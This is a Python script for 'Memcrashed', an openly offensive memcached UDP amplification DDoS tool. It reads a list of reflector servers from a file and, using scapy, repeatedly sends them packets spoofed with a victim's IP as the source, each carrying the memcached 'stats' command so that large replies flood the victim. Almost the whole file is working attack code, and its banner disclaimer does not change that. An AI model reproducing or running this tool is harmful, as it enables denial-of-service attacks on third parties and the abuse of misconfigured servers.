#!/usr/bin/python
import sys, os, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager

starttime=time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:
            yield
        finally:
            sys.stdout = old_stdout

class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''

   ---¬   ---¬-------¬---¬   ---¬ ------¬------¬  -----¬ -------¬--¬  --¬-------¬------¬
   ----¬ ----¦--ã====-----¬ ----¦--ã====---ã==--¬--ã==--¬--ã====---¦  --¦--ã====---ã==--¬
   --ã----ã--¦-----¬  --ã----ã--¦--¦     ------ã--------¦-------¬-------¦-----¬  --¦  --¦
   --¦L--ã---¦--ã==-  --¦L--ã---¦--¦     --ã==--¬--ã==--¦L====--¦--ã==--¦--ã==-  --¦  --¦
   --¦ L=- --¦-------¬--¦ L=- --¦L------¬--¦  --¦--¦  --¦-------¦--¦  --¦-------¬------ã-
   L=-     L=-L======-L=-     L=- L=====-L=-  L=-L=-  L=-L======-L=-  L=-L======-L=====-

                                        Author: @037
                                        Version: 3.1

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                     
'''
print(logo)

target = input("[?] Enter target IP address: ")
power = int(input("[?] Enter preferred power (Default 1): ") or "1")
data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

while True:
    try:
        ip_arrayn = []
        with open('bots.txt') as my_file:
            for line in my_file:
                ip_arrayn.append(line)
        ip_array = [s.rstrip() for s in ip_arrayn]
        counter= int(0)
        for i in ip_array:
            if power>1:
                print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                with suppress_stdout():
                    send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
            elif power==1:
                print('[+] Sending 1 forged UDP packet to: %s' % i)
                with suppress_stdout():
                    send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
    except:
        print('')
        print('[•] Exiting Platform. Have a wonderful day.')
        break